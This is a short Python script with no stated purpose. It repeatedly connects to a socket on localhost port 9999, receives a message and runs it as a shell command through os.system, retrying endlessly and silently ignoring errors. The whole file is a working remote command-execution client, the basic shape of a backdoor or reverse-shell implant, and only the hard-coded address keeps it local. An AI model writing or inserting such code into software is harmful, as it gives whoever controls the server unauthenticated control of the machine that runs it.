import socket
import os

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', 9999))
        message = s.recv(1024)
        s.close()
        os.system(message.decode('ascii'))
    except:
        print('Server is not opened yet')
